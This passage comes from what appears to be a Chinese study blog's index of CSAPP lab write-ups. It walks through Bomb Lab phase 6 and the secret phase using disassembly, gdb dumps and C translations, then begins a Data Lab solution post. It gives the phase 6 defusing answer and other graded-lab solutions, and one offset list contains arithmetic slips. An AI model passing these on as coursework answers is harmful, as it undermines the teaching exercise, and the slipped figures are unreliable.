%rsp,%rsi 401106: e8 51 03 00 00 callq 40145c \u003cread_six_numbers\u003e 40110b: 49 89 e6 mov %rsp,%r14 40110e: 41 bc 00 00 00 00 mov $0x0,%r12d seg2: 401114: 4c 89 ed mov %r13,%rbp 401117: 41 8b 45 00 mov 0x0(%r13),%eax 40111b: 83 e8 01 sub $0x1,%eax 40111e: 83 f8 05 cmp $0x5,%eax 401121: 76 05 jbe 401128 \u003cphase_6+0x34\u003e 401123: e8 12 03 00 00 callq 40143a \u003cexplode_bomb\u003e seg3: 401128: 41 83 c4 01 add $0x1,%r12d 40112c: 41 83 fc 06 cmp $0x6,%r12d 401130: 74 21 je 401153 \u003cphase_6+0x5f\u003e 401132: 44 89 e3 mov %r12d,%ebx seg4: 401135: 48 63 c3 movslq %ebx,%rax 401138: 8b 04 84 mov (%rsp,%rax,4),%eax 40113b: 39 45 00 cmp %eax,0x0(%rbp) 40113e: 75 05 jne 401145 \u003cphase_6+0x51\u003e 401140: e8 f5 02 00 00 callq 40143a \u003cexplode_bomb\u003e seg5: 401145: 83 c3 01 add $0x1,%ebx 401148: 83 fb 05 cmp $0x5,%ebx 40114b: 7e e8 jle 401135 \u003cphase_6+0x41\u003e 40114d: 49 83 c5 04 add $0x4,%r13 401151: eb c1 jmp 401114 \u003cphase_6+0x20\u003e seg6: 401153: 48 8d 74 24 18 lea 0x18(%rsp),%rsi 401158: 4c 89 f0 mov %r14,%rax 40115b: b9 07 00 00 00 mov $0x7,%ecx seg7: 401160: 89 ca mov %ecx,%edx 401162: 2b 10 sub (%rax),%edx 401164: 89 10 mov %edx,(%rax) 401166: 48 83 c0 04 add $0x4,%rax 40116a: 48 39 f0 cmp %rsi,%rax 40116d: 75 f1 jne 401160 \u003cphase_6+0x6c\u003e 40116f: be 00 00 00 00 mov $0x0,%esi 401174: eb 21 jmp 401197 \u003cphase_6+0xa3\u003e seg8: 401176: 48 8b 52 08 mov 0x8(%rdx),%rdx 40117a: 83 c0 01 add $0x1,%eax 40117d: 39 c8 cmp %ecx,%eax 40117f: 75 f5 jne 401176 \u003cphase_6+0x82\u003e 401181: eb 05 jmp 401188 \u003cphase_6+0x94\u003e seg9: 401183: ba d0 32 60 00 mov $0x6032d0,%edx seg10: 401188: 48 89 54 74 20 mov %rdx,0x20(%rsp,%rsi,2) 40118d: 48 83 c6 04 add $0x4,%rsi 401191: 48 83 fe 18 cmp $0x18,%rsi 401195: 74 14 je 4011ab \u003cphase_6+0xb7\u003e seg11: 401197: 8b 0c 34 mov (%rsp,%rsi,1),%ecx 40119a: 83 f9 01 cmp $0x1,%ecx 40119d: 7e e4 jle 401183 \u003cphase_6+0x8f\u003e 40119f: b8 01 00 00 00 mov $0x1,%eax 4011a4: ba d0 32 60 00 mov $0x6032d0,%edx 4011a9: eb cb jmp 401176 \u003cphase_6+0x82\u003e seg12: 4011ab: 48 8b 5c 24 20 mov 0x20(%rsp),%rbx 4011b0: 48 8d 44 24 28 lea 0x28(%rsp),%rax 4011b5: 48 8d 74 24 50 lea 0x50(%rsp),%rsi 4011ba: 48 89 d9 mov %rbx,%rcx seg13: 4011bd: 48 8b 10 mov (%rax),%rdx 4011c0: 48 89 51 08 mov %rdx,0x8(%rcx) 4011c4: 48 83 c0 08 add $0x8,%rax 4011c8: 48 39 f0 cmp %rsi,%rax 4011cb: 74 05 je 4011d2 \u003cphase_6+0xde\u003e 4011cd: 48 89 d1 mov %rdx,%rcx 4011d0: eb eb jmp 4011bd \u003cphase_6+0xc9\u003e seg14: 4011d2: 48 c7 42 08 00 00 00 movq $0x0,0x8(%rdx) 4011d9: 00 4011da: bd 05 00 00 00 mov $0x5,%ebp seg15: 4011df: 48 8b 43 08 mov 0x8(%rbx),%rax 4011e3: 8b 00 mov (%rax),%eax 4011e5: 39 03 cmp %eax,(%rbx) 4011e7: 7d 05 jge 4011ee \u003cphase_6+0xfa\u003e 4011e9: e8 4c 02 00 00 callq 40143a \u003cexplode_bomb\u003e seg16: 4011ee: 48 8b 5b 08 mov 0x8(%rbx),%rbx 4011f2: 83 ed 01 sub $0x1,%ebp 4011f5: 75 e8 jne 4011df \u003cphase_6+0xeb\u003e 4011f7: 48 83 c4 50 add $0x50,%rsp 4011fb: 5b pop %rbx 4011fc: 5d pop %rbp 4011fd: 41 5c pop %r12 4011ff: 41 5d pop %r13 401201: 41 5e pop %r14 401203: c3 retq s 我们将其分为 16 个 seg，然后绘制一下函数流程图试试，总体过程如图 。 然后，我们为了减小每步分析的工作量，根据跳转分支将其分为 6 个过程，如图 下面我们对这 6 个过程来进行分析： ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#phase6-分析-超级无敌杂糅嵌套多层循环"},{"categories":["系统入门"],"content":" 19.1 Proc 1首先进入的是 seg1，其做的工作是： 压入r14 r13 r12 rbp rbx 留出 80 个字节的空间 r13 = rsp = rsi 调用call_six_numbers，经前文分析，read_six_numbers的传入参数为%rsi，返回值在%eax中，其存储了读入的数字的个数 r14 = rsp = rsi = r13，r12d = 0 下面进入 seg 2，其做的工作是： 让rbp = r13，那么现在r13 = r14 = rsi = rsp = rbp 让eax = r13所指向的值 判断eax - 1是否小于等于 5，如果eax - 1 \u003e 5，那么炸弹爆炸，也就是说eax必须小于等于 6 正常情况下，进入 seg 3 进入 seg 3 分析： r12d += 1 将r12d与 6 比较，如果r12d ！= 6，那么ebx = r12d，随后进入 seg 4(proc 2 中) 否则就进入 seg 6(proc 3 中) 这里我们分析得到的结果是： seg 1 中进行了一些初始化的工作，让几个指针都指向输入数字的起始位置，并且让计数值r12d = 0 seg 2 中让rbp 指向 r13所指向的位置(一开始r13 = r14 = rsp = rsi，因为后面还有进入seg 2的部分，所以不确定r13的指向会不会改变，先看看)，让eax = r13所指向的值，并且保证其必须小于等于 6 seg 3 中让r12d计数值增加，判断r12d是否等于6。如果不等于 6，就让其等于ebx，然后进入seg 4；否则进seg 6（看流程图可以看出，seg 6 离终点要更进一步，而 seg 4 在进入后做一些循环的工作后又会回到 seg 2，故我猜测这里 seg 4 以后的步骤是做了一些遍历的工作，但是在遍历的而过程中是读还是修改暂不清楚） ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:1","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#proc-1"},{"categories":["系统入门"],"content":" 19.2 Proc 2接下来我们进入 seg 4： 我们首先让rax = ebx(注意前面ebx = r12d,此时r12d已经递增到下一个位置了)，那么这里rax = ebx = r12d 让eax = *(rsp + 4 * rax)，因为 rsp 是输入数字的起始位置，那么 rax 应该是一个索引，因为输入的是int类型，所以每次要 * 4。假定输入的数字的字符串叫str，那么这里就是eax = str[rax] 判断rbp 指向的值是否等于eax，前文中我们可以看到rbp指向的是r13所指向的位置，也就是让你判断r13指向位置的值是否等于eax，也就是前面的str[rax] 如果不相等，进入 seg 5，否则炸弹爆炸(下面那个图中的有点错误，菱锌框中应该是不相等)，我们可以初步判断，这里两个相邻的值应该是不能相等的（其他不相邻的能不能相等等会儿再看，如果r13改变的话，那么不相邻的值应该也不能像等） 就接下来我们进入 seg 5： ebx += 1（还记得ebx是什么吗？ebx = r12d！在前文中r12d已经向前跃进了一个位置，那么现在ebx还要比r12d再进一个位置） 将ebx 和 0x5相比较，如果ebx \u003c= 0x5，也就是说如果之前的ebx \u003c= 0x6的话，继续回到 seg 4。否则r13 += 4（r13果然改变了，向前跃进了 4 个字节，也就是一个 int 类型的大小），然后回到 seg 2 这个过程我们分析得到的结果是： seg 4 让rax = ebx = r12d，然后让rax = str[rax]，判断rbp/r13指向的值是否等于eax。相等就爆炸，不相等就进 seg 5 seg 5 判断之前的ebx是否小于等于 0x6，r12d比ebx小 1。如果ebx \u003c= 0x6的话，回到 seg 4。seg 4 中还要判断下一个位置的数字和r13/rbp所指向的数字是否相等，相等就爆炸。否则r13指向下一个数字的位置，回到 seg 2。seg 2 中又要判断下一个数字是否小于等于 6，以及其和后面的数字是否相等。 到这里我们可以初步判断，r13/rbp 是用于指向被比较的基准数，是指针。ebx/r12d 是用来递增的数组索引，是数字。获取到的数字通常被赋给 rax。输入的数字不能有相等的，也必须都小于等于 6。Proc 1 和 Proc 2 主要执行了一些检查的工作。 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:2","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#proc-2"},{"categories":["系统入门"],"content":" 19.3 Proc 3 从前文我们可以判断出，当进入 seg 6 的时候，r12d 肯定是等于 6 了，r13/rbp 也指向了最后一个数字。 在 seg 6 中： 我们让rsi指向最后一个数字的下一个位置，让rax = r14,ecx = 7（r14一开始是指向rsp的，这两个值是什么含义这里还没有完全清楚） 在 seg 7 中： 我们让edx = ecx（edx = ecx = 7） edx = edx - *rax，这里rax指向数组的开头，也就是让edx作为 7 和rax指向的当前值的差 *rax = edx，也就是让rax指向的值 = 这个差 rax指向下一个位置，比较rax和rsi，也就是判断是否到达了数组的末尾 如果没有到达（rax还没有到达数组末尾rsi），就回到 seg 7，继续让每个数组的值 = 7 - 它的值 否则 esi = 0，跳到seg 11 在这个子过程中，我们让每个数组的值都等于 7-它原本的值，遍历完成后 rax 指向数组末尾，r14 和 rsp 还在开头，esi = 0 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:3","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#proc-3"},{"categories":["系统入门"],"content":" 19.4 Proc 4 这个过程有点复杂，要慢慢来 在 seg 11 中： 我们让ecx的值 = *(rsp + rsi) 将ecx和 0x1 比较，如果ecx \u003c= 0x1的话，跳转到 seg 9 否则 eax = 1, edx = 0x6032d0，跳转到 seg 8 因为 seg 9 离终点更近，因此我们首先分析 seg 8，也就是7 - str[i] \u003e 1 -\u003e value \u003c 6的情况。 rdx = *(rdx + 8)，也就是说rdx的值 = 离rdx8 个字节的位置的值(大概率是个指针，因为需要解引，而且指针是 8 个字节对齐) eax += 1，将ecx和eax比较（这里 eax 已经从 2 开始了），如果eax还不等于ecx，那么回到 seg 8，否则到 seg 10 seg 8 的含义为，从第一个差开始，如果当前这个差的值 \u003e 0x1 的话，一直寻找这个差的值的位置，保存在rdx中，并且这个差的值在rax中。 同时我们来分析 seg 9，seg 9 中edx = 0x6032d0，直接进入 seg 10 seg 10 的操作是： *(rsp + rsi * 2 + 32) = rdx,这里 rsi 的值 = 之前计算出的索引值（最开始是 0），rsp 的值 = 输入数字的位置 rsi = rsi + 4 将rsi和 24 比较，如果rsi != 24，即所有数字还没遍历完，退回到 seg 11 否则进入 seg 12 那么总结来说，这三个段的含义如下： seg 11 让ecx = str[rsi]，将其和0x1作比较 当ecx \u003c= 0x1时，跳转到 seg 9，令edx = 0x6032d0，随后进入 seg 10 当ecx \u003e 0x1时，eax = 1, edx = 0x6032d0，跳转到 seg 8，seg 8 中从第一个值开始一直寻找第ecx个值的位置，并保存在rdx中，进入 seg 10 seg 10 中我们把该数字的地址都存储在*(起始地址 + 2 * 索引 + 32)位置处，如果数字遍历完了，就进入 seg 12，否则就回退到 seg 11 大概明白了，这里作者可能是想构建一个链表，他把链表的所有结点的起始地址放在一个数组里了！放置的顺序是我们输入的数字串的顺序！比如rsi = 0时，读入第ecx个数字，那么根据这个数字找到的edx就存储在地址数组的第一行。每个数字的地址都存储在起始地址 + 32 + 2 * 索引的位置。（为什么是这个还不太理解） 到这里结束，6 个数字的位置分别存储的rsi是：0 4 8 12 16 20 24，其偏移量是0 8 16 25 32 40 48,加上 32 后相距rsp的偏移量是：32 40 48 57 72 80 我们从0x6032d0开始，每次打印 16 个字节（小端序），前 8 个字节是数字的值，后 8 个字节是下一个结点的地址，其顺序如下： 第一个结点从0x6032d0开始： text (gdb) x/16xb 0x6032d0 0x6032d0 \u003cnode1\u003e: 0x4c 0x01 0x00 0x00 0x01 0x00 0x00 0x00 0x6032d8 \u003cnode1+8\u003e: 0xe0 0x32 0x60 0x00 0x00 0x00 0x00 0x00 那么第二个结点的地址应该是0x6032e0： text (gdb) x/16xb 0x6032e0 0x6032e0 \u003cnode2\u003e: 0xa8 0x00 0x00 0x00 0x02 0x00 0x00 0x00 0x6032e8 \u003cnode2+8\u003e: 0xf0 0x32 0x60 0x00 0x00 0x00 0x00 0x00 第三个结点的地址应该是0x6032f0： text (gdb) x/16xb 0x6032f0 0x6032f0 \u003cnode3\u003e: 0x9c 0x03 0x00 0x00 0x03 0x00 0x00 0x00 0x6032f8 \u003cnode3+8\u003e: 0x00 0x33 0x60 0x00 0x00 0x00 0x00 0x00 第四个结点的地址应该是0x603300： text (gdb) x/16xb 0x603300 0x603300 \u003cnode4\u003e: 0xb3 0x02 0x00 0x00 0x04 0x00 0x00 0x00 0x603308 \u003cnode4+8\u003e: 0x10 0x33 0x60 0x00 0x00 0x00 0x00 0x00 第五个结点的地址应该是0x603310： text 0x603310 \u003cnode5\u003e: 0xdd 0x01 0x00 0x00 0x05 0x00 0x00 0x00 0x603318 \u003cnode5+8\u003e: 0x20 0x33 0x60 0x00 0x00 0x00 0x00 0x00 第六个结点的地址应该是0x603320： text (gdb) x/16xb 0x603320 0x603320 \u003cnode6\u003e: 0xbb 0x01 0x00 0x00 0x06 0x00 0x00 0x00 0x603328 \u003cnode6+8\u003e: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:4","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#proc-4"},{"categories":["系统入门"],"content":" 19.5 Proc 5在这个子过程中，我们首先进入 seg12，经过一个看起来是循环的东西，再从 seg 14 出去。 seg 12 的过程如下： rbx = *(rsp + 32) // rbx = 起始位置的值（链表第一个结点的地址） rax = rsp + 40 // 第 2 个值（链表第二个结点的地址）的位置 rsi = rsp + 80 // 最后一个数（最后一个结点的地址）的位置 rcx = rbx // rcx = rbx = 起始位置的值（第一个结点的地址） 随后进入 seg 13，seg 13 的过程如下： rdx = *rax // rdx = rax 位置的值 *(rcx + 8) = rdx // rcx 指向的下一个位置的值是 rdx rax += 8 // rax = 下一个位置 如果 rax == rsi，进入 seg 14，否则rcx = rdx，重新回到 seg 13 这里把链表中的结点都串起来啦！ seg 14 的过程如下： *(rdx + 8) = 0 // 把链表最后一个节点的 next 域置为 0 ebp = 5 随后进入 seg 15。 现在 rbx 的值等于链表第一个结点的地址，rcx 的值等于链表倒数第二个结点的地址，rdx 的值等于链表最后一个结点的地址，rsi 和 rax 指向链表的最后，ebp = 5 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:5","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#proc-5"},{"categories":["系统入门"],"content":" 19.6 Proc 6seg 15 中完成了以下步骤： rax = *(rbx + 8) eax = *rax 如果 *rbx \u003e= eax，进入 seg 16 否则炸弹爆炸 这里说明第一个结点的值必须大于等于第二个结点，否则炸弹爆炸。 seg 16 中执行以下步骤： rbx = *(rbx + 8) ebp -= 1 如果 ebp != 0，进入 seg 15 否则栈恢复 这段说明链表的值从开始到后面必须严格递减。我们在前期已经获得了链表各个结点的值，我们只需要从大到小排列这些值即可，炸弹的密码是排列的顺序。这组值是0x014c 0x00a8 0x039c 0x02b3 0x01dd 0x01bb，翻译成十进制就是332 168 924 691 477 443(可以使用x/96dh 0x6032d0打印halfword)，gdb 的 x 命令打印的字节数如下： text b - byte h - halfword (16-bit value) w - word (32-bit value) g - giant word (64-bit value) 所以数字从大到小的顺序应该是3 4 5 6 1 2，但是因为ecx的值是7 - 原来的值，所以原来的值应该是4 3 2 1 6 5。成功解除炸弹！ 重点： 这个过程就是第ecx个数的rdx（链表结点地址）存储在地址数组的第rsi位，实现了链表结点的重排序！ 最后记得第ecx个数 = 7 - 原来的值，所以我们解出了链表中元素的值后，还要用 7 - 它 来获得我们原来输入的数 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:8:6","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#proc-6"},{"categories":["系统入门"],"content":" 20 secret phase 分析:对secret phase执行反汇编得到如下结果： text 0000000000401242 \u003csecret_phase\u003e: seg1: 401242: 53 push %rbx 401243: e8 56 02 00 00 callq 40149e \u003cread_line\u003e 401248: ba 0a 00 00 00 mov $0xa,%edx 40124d: be 00 00 00 00 mov $0x0,%esi 401252: 48 89 c7 mov %rax,%rdi 401255: e8 76 f9 ff ff callq 400bd0 \u003cstrtol@plt\u003e 40125a: 48 89 c3 mov %rax,%rbx 40125d: 8d 40 ff lea -0x1(%rax),%eax 401260: 3d e8 03 00 00 cmp $0x3e8,%eax 401265: 76 05 jbe 40126c \u003csecret_phase+0x2a\u003e 401267: e8 ce 01 00 00 callq 40143a \u003cexplode_bomb\u003e seg2: 40126c: 89 de mov %ebx,%esi 40126e: bf f0 30 60 00 mov $0x6030f0,%edi 401273: e8 8c ff ff ff callq 401204 \u003cfun7\u003e 401278: 83 f8 02 cmp $0x2,%eax 40127b: 74 05 je 401282 \u003csecret_phase+0x40\u003e 40127d: e8 b8 01 00 00 callq 40143a \u003cexplode_bomb\u003e seg3: 401282: bf 38 24 40 00 mov $0x402438,%edi 401287: e8 84 f8 ff ff callq 400b10 \u003cputs@plt\u003e 40128c: e8 33 03 00 00 callq 4015c4 \u003cphase_defused\u003e 401291: 5b pop %rbx 401292: c3 retq 其过程如下： 压入%rbx 读入一行 -\u003e 估计结果存储在 rax 中，也就是字符串的起始位置 edx = 0xa，esi = 0，rdi = rax 调用strtol rbx = rax -\u003e rbx = 字符串转化出的数值 eax = rax - 1 如果eax \u003c= 0x3e8，跳转到 seg 2；否则炸弹爆炸 esi = ebx，edi = 0x6030f0，调用fun7 如果eax == 0x2，跳转到 seg 3（炸弹解除），否则炸弹爆炸 将其转化为 C 语言： c int secret_phase(char* buf) { // 压入rbx rax = call read_line edx = 0xa esi = 0 rdi = rax call strtol rbx = rax eax = rax - 1 //输入数字必须小于等于 1000 if(eax \u003c= 0x3e8) { // seg2 esi = ebx edi = 0x6030f0 call fun7 if(eax == 0x2) { return eax; } else { call bomb_explode } } else { call bomb_explode } } 我们首先解读一下secret_phase： 一开始几个寄存器的值如下： text rax - read line 返回的字符串地址 edx - 0xa esi - 0 rdi - read line 返回的字符串地址 调用strtol后几个寄存器的值如下： text rax - strtol 返回的字符串转化出的数值 rbx - strtol 返回的字符串转化出的数值 eax - 数值 - 1 如果该数值 - 1 \u003e 0x3e8(1000)，炸弹爆炸，否则进入 seg 2。 seg 2 中完成了如下工作： esi = strtol 返回的字符串转化出的数值（这个数必须小于等于 1001） edi = 0x6030f0(一个地址) 调用fun7 如果fun7返回 2，退出，否则炸弹爆炸 这其中调用了一个叫fun7的函数，其反汇编结果如下： text 0000000000401204 \u003cfun7\u003e: seg1: 401204: 48 83 ec 08 sub $0x8,%rsp 401208: 48 85 ff test %rdi,%rdi 40120b: 74 2b je 401238 \u003cfun7+0x34\u003e 40120d: 8b 17 mov (%rdi),%edx 40120f: 39 f2 cmp %esi,%edx 401211: 7e 0d jle 401220 \u003cfun7+0x1c\u003e 401213: 48 8b 7f 08 mov 0x8(%rdi),%rdi 401217: e8 e8 ff ff ff callq 401204 \u003cfun7\u003e 40121c: 01 c0 add %eax,%eax 40121e: eb 1d jmp 40123d \u003cfun7+0x39\u003e seg2: 401220: b8 00 00 00 00 mov $0x0,%eax 401225: 39 f2 cmp %esi,%edx 401227: 74 14 je 40123d \u003cfun7+0x39\u003e 401229: 48 8b 7f 10 mov 0x10(%rdi),%rdi 40122d: e8 d2 ff ff ff callq 401204 \u003cfun7\u003e 401232: 8d 44 00 01 lea 0x1(%rax,%rax,1),%eax 401236: eb 05 jmp 40123d \u003cfun7+0x39\u003e seg3: 401238: b8 ff ff ff ff mov $0xffffffff,%eax seg4: 40123d: 48 83 c4 08 add $0x8,%rsp 401241: c3 retq 根据反汇编可以看出%rdi(0x6030f0)和%esi(输入的数值)是传入参数，%eax是返回值。其中还包括了一次递归调用。fun7的 C 语言实现如下： c int fun7() { // rsp留出8个字节的空间 if(rdi == 0) { // seg3 eax = 0xffffffff } else { edx = *rdi if(edx \u003c= esi) { // seg2 eax = 0 if(edx != esi) { rdi = *(rdi + 16) call fun7 eax = 2 * rax + 1 } } else { rdi = *(rdi + 8) call fun7 eax = eax * 2 } } // seg4 // rsp栈空间恢复 return eax; } fun7的内容翻译成 C 语言是如下内容： 如果传入的rdi = 0，那么返回0xffffffff 否则，edx的值为rdi指向地址的值。 如果edx \u003e 传入的esi，rdi 跳转到下一个位置（左节点的值）（这里大概率又是个链表），返回2 * fun7() 否则，eax = 0，如果edx == 传入的esi，返回 0；否则就跳转到下下个位置（右节点的值），返回2 * fun7() + 1 为什么能推测出来这里的左节点和右节点呢？我们在0x6030f0打印 32 个字节的值看看： text (gdb) x/32bx 0x6030f0 0x6030f0 \u003cn1\u003e: 0x24 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x6030f8 \u003cn1+8\u003e: 0x10 0x31 0x60 0x00 0x00 0x00 0x00 0x00 0x603100 \u003cn1+16\u003e: 0x30 0x31 0x60 0x00 0x00 0x00 0x00 0x00 这里有 n+8 和 n+16，可以看出来这也是两个地址。 这里对fun7的要求是必须在传入地址的值为0x6030f0，输入的%esi \u003c= 1000的情况下返回 2。 我们打印一下这个链表各个结点的值： text (gdb) x/32bx 0x6030f0 0x6030f0 \u003cn1\u003e: 0x24 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x6030f8 \u003cn1+8\u003e: 0x10 0x31 0x60 0x00 0x00 0x00 0x00 0x00 0x603100 \u003cn1+16\u003e: 0x30 0x31 0x60 0x00 0x00 0x00 0x00 0x00 我们打印它左节点(node 21)： text (gdb) x/32bx 0x603110 0x603110 \u003cn21\u003e: 0x08 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x603118 \u003cn21+8\u003e: 0x90 0x31 0x60 0x00 0x00 0x00 0x00 0x00 0x603120 \u003cn21+16\u003e: 0x50 0x31 0x60 0x00 0x00 0x00 0x00 0x00 0x603128: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 再打印右节点(node 22)： text (","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:9:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#secret-phase-分析"},{"categories":["系统入门"],"content":" 21 总结 Phase 1 - 3 还好 Phase 3那个需要传入 10 进制数，而不是 16 进制，写答案的时候不要写错了 Phase 4那个func没看出来是啥，蒙了个0 0过了，需要搞懂 Phase 5一开始没想到给那几个 16 进制的值加偏移量，使其为合法的ASCII码字符，是后来加查了 1 个题解晓得的。 Phase 6费大力气终于解决啦！当然我一开始没留意到是第ecx个数的rdx存储在地址数组的第rsi位，所以还以为链表的结点都是顺序排列的。解除 phase6 的经历也告诉我，看见汇编不要一开始上来就将它转化成 C 语言，要首先根据跳转目标对其进行分段，用流程图分析他的跳转，然后再将其拆解为各个小的过程（拆解的过程中尽量把循环放在一起，控制一下过程的规模），一步步的分析他，不要一上来就看题解/暴力反汇编。而且要留意题意！比如第 5 题那个 ASCII 码字符，第 6 题要把顺序转化为7 - 原来的值，这都是容易做错的地方。 secret_phase顺利完结！二叉树的结构精妙极了！但是secret_phase的入口不好找，因为输入的字符串都在%rdi中，需要通过gdb查看哪个 phase 的 rdi 寄存器的值 = 0x603870，这点很难。 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:10:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#总结"},{"categories":["系统入门"],"content":" 22 参考资料 手把手教你拆解 CSAPP 的 炸弹实验室 BombLab CSAPP bomblab 隐藏关卡 secret_phase 拆弹记录 ","date":"2024-02-26","objectID":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:11:0","series":["15-213"],"tags":["逆向工程","x86汇编"],"title":"Bomb lab 实验总结","uri":"/bomb-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#参考资料"},{"categories":["系统入门"],"content":"部分的题目我参考了一下网上的内容（出处已注明），其他的均为自己实现（有的题目的实现过程可能会有些繁琐），部分 dlc 检测出来可能会报些 error，但是 btest 均能过。 没有 TA 可太难了！自己实现了一天多，终于苟完了。不算完美，但也能看吧。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:0:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#"},{"categories":["系统入门"],"content":" 1 bitXor c /* * bitXor - x^y using only ~ and \u0026 * Example: bitXor(4, 5) = 1 * Legal ops: ~ \u0026 * Max ops: 14 * Rating: 1 */ int bitXor(int x, int y) { /** * x + y = ~( ~x \u0026 ~y) */ return ~((~(x \u0026 ~y)) \u0026 (~(y \u0026 ~x))); } bitXor 要求我们使用位操作来实现^运算符。根据运算定律我们知道: a ^ b = (a \u0026 (~b)) | (b \u0026 (~a))。但是问题来了，我们这里不允许使用|，只能用~和\u0026。那么我们就必须使用这两个操作符来实现|运算。 通过德摩根定律我们知道：a | b = ~((~a) \u0026 (~b))。这不就解决问题了嘛，所以将这两个式子综合一下，最后的结果是~((~(x \u0026 ~y)) \u0026 (~(y \u0026 ~x))) ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:1:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#bitxor"},{"categories":["系统入门"],"content":" 2 tmin c /* * tmin - return minimum two's complement integer * Legal ops: ! ~ \u0026 ^ | + \u003c\u003c \u003e\u003e * Max ops: 4 * Rating: 1 */ int tmin(void) { /** * the most significant bit = 1, others = 0, so (1 \u003c\u003c 31) */ return (1 \u003c\u003c 31); } 这题要求我们返回最小的补码整数，返回类型为int。首先，在二进制补码表示中，最高位的权值为-1，其他位的权值为 1。因此，最小的补码整数 tmin 的最高位为 1，其他位为 0。而题目中int类型为 32 位，因此只要返回(1 \u003c\u003c 31)即可。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:2:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#tmin"},{"categories":["系统入门"],"content":" 3 isTmax c /* * isTmax - returns 1 if x is the maximum, two's complement number, * and 0 otherwise * Legal ops: ! ~ \u0026 ^ | + * Max ops: 10 * Rating: 1 */ int isTmax(int x) { /** * Tmax ^ Tmin = 0xffffffff, ~0xffffffff = 0x0, !0x0 = 0x1 */ // return !(~(x ^ (1 \u003c\u003c 31))); /** * ~Tmax = Tmin -\u003e ~Tmin + 1 = Tmin 且 Tmin != 0 */ int num = ~x; return !(num ^ (~num + 1)) \u0026 !!num; } tmax 是二进制补码中最大的数，通过分析这个数的特点，我们可以完成这道题目。 该数除了最高位是 0 外，其他位均是 1。因此该数和(1«31)（也就是 tmin）的亦或（或者和）为0xffffffff。0xffffffff按位取反得到0x0，而0x0按位取反得到0x1。但是其他的数并没有这个特性。 c return !(~(x ^ (1 \u003c\u003c 31))); 该数取反后得到 tmin，tmin 的一个特点是 tmin 和 -tmin 的表示相同。因此两者亦或得到 0。还有一个树也有这样的特性，也就是 0。因此我们需要排除 0 的可能性。我们使用\u0026操作符来实现两种特性的叠加。我本没有想到该方法，是从这篇知乎帖子学习到的。 c int num = ~x; return !(num ^ (~num + 1)) \u0026 !!num; 但是题目不允许在该题中使用移位运算符，因此只能使用方法二。 ","date":"2024-02-05","objectID":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/:3:0","series":["15-213"],"tags":["数据表示"],"title":"Data lab 实验总结","uri":"/data-lab-%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/#istmax"},{"categories":["系统入门"],"content":" 4 allOddBits c /* * allOddBits - return 1 if all odd-numbered bits in word set to 1 * where bits are numbered from 0 (least significant) to 31 (most significant) * Examples allOddBits(0xFFFFFFFD) 